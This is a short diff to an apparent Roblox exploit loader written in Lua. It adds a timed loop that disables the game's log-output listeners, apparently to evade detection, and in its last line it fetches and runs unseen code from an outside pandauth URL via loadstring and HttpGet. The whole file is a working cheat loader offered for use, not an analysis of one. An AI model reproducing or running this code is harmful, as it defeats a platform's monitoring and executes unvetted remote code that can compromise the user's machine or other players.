@@ -1,10 +1,16 @@
 --bbz
 if getconnections then
-	print("HI")
-    for i, v in next, getconnections(game:GetService("LogService").MessageOut) do
-        if v.Function == nil then
-            v:Disable()
-        end
-    end
+	local FunctionDisabled = false
+	local Timeout = os.clock()
+	repeat
+		print(math.random(1, 10000))
+		task.wait()
+		for i, v in next, getconnections(game:GetService("LogService").MessageOut) do
+			if v.Function == nil then
+				FunctionDisabled = true
+				v:Disable()
+			end
+		end
+	until FunctionDisabled == true or os.clock() - Timeout >= 10
 end
 loadstring(game:HttpGet("https://vss.pandauth.com/virtual/file/a4e5b7bea65a486b"))()
